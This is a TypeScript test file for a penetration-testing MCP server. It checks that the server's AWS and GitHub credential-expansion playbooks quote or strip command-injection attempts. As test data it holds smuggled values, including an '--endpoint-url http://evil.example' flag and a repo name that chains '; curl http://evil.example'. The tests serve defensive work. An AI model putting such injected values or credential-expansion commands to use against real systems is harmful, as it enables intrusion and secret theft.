import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { existsSync, unlinkSync } from 'fs';
import type { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import { z } from 'zod';
import { GraphEngine } from '../../services/graph-engine.js';
import { registerAwsPlaybookTool } from '../aws-playbook.js';
import { registerGithubPlaybookTool } from '../github-playbook.js';
import type { EngagementConfig } from '../../types.js';
import { cleanupTestPersistence } from '../../__tests__/helpers/cleanup-test-persistence.js';

const TEST_STATE_FILE = './state-test-playbook-injection.json';

function makeConfig(): EngagementConfig {
  return {
    id: 'test-pb-inj', name: 'pb inj', created_at: new Date().toISOString(),
    scope: { cidrs: ['10.10.10.0/24'], domains: [], exclusions: [] },
    objectives: [], opsec: { name: 'pentest', max_noise: 1 },
  };
}
function cleanup(): void {
  cleanupTestPersistence(TEST_STATE_FILE);
  try { if (existsSync(TEST_STATE_FILE)) unlinkSync(TEST_STATE_FILE); } catch { /* ignore */ }
}

describe('playbook command-injection fencing (e2e)', () => {
  let engine: GraphEngine;
  let handlers: Record<string, (a: any) => Promise<any>>;
  let configs: Record<string, any>;

  beforeEach(() => {
    cleanup();
    engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    handlers = {};
    configs = {};
    const server = {
      registerTool(name: string, c: unknown, h: (a: any) => Promise<any>) { handlers[name] = h; configs[name] = c; },
    } as unknown as McpServer;
    registerAwsPlaybookTool(server, engine);
    registerGithubPlaybookTool(server, engine);
  });
  afterEach(() => {
    engine.dispose();
    cleanup();
  });

  it('aws: a malicious parsed principal + operator region cannot inject an aws CLI global flag', async () => {
    engine.addNode({
      id: 'cred-aws', type: 'credential', label: 'aws', confidence: 1,
      discovered_at: new Date().toISOString(),
      cred_material_kind: 'token',
      cred_user: 'alice --endpoint-url http://evil.example',
      aws_profile: 'prod',
    } as any);
    engine.addNode({
      id: 'cloud-malicious-caller', type: 'cloud_identity', label: 'malicious caller', confidence: 1,
      discovered_at: new Date().toISOString(), provider: 'aws', cloud_account: '111122223333',
      arn: 'arn:aws:iam::111122223333:user/alice --endpoint-url http://evil.example',
      principal_type: 'user', caller_kind: 'user',
      principal_name: 'alice --endpoint-url http://evil.example',
    } as any);
    engine.addEdge('cloud-malicious-caller', 'cred-aws', {
      type: 'OWNS_CRED', confidence: 1, discovered_at: new Date().toISOString(),
      binding_source: 'aws_sts_get_caller_identity',
      credential_execution_binding: 'profile:prod',
    });
    const res = await handlers.expand_aws_credential({
      credential_id: 'cred-aws',
      regions: ['us-east-1'],
      skip_inventory: false,
      include_destructive: true,
    });
    const commands = (JSON.parse(res.content[0].text).steps as { command?: string }[]).map(s => s.command ?? '').join('\n');
    // Injected flag is contained INSIDE single quotes (neutralized), never a bare token.
    expect(commands).toContain(`--user-name 'alice --endpoint-url http://evil.example'`);
    expect(commands).not.toMatch(/--user-name alice --endpoint-url/);
  });

  it('aws: the public schema rejects a region containing CLI injection tokens', () => {
    const schema = z.object(configs.expand_aws_credential.inputSchema);
    expect(schema.safeParse({
      credential_id: 'cred-aws', regions: ['us-east-1 --endpoint-url http://evil.example'],
    }).success).toBe(false);
  });

  it('github: a malicious candidate repo cannot inject shell or a gh flag', async () => {
    engine.addNode({
      id: 'cred-gh', type: 'credential', label: 'gh', confidence: 1,
      discovered_at: new Date().toISOString(),
      cred_material_kind: 'pat', cred_user: 'octocat',
    } as any);
    const res = await handlers.expand_github_credential({
      credential_id: 'cred-gh', max_repos: 10, include_orgs: false,
      candidate_repos: ['o/r; curl http://evil.example'],
    });
    const commands = (JSON.parse(res.content[0].text).steps as { command: string }[]).map(s => s.command).join('\n');
    // `;` and other shell metachars are stripped; the remainder is single-quoted inside the path.
    expect(commands).toContain(`/repos/'o/r curl http://evil.example'/actions/secrets`);
    expect(commands).not.toMatch(/repos\/o\/r; curl/);
  });
});
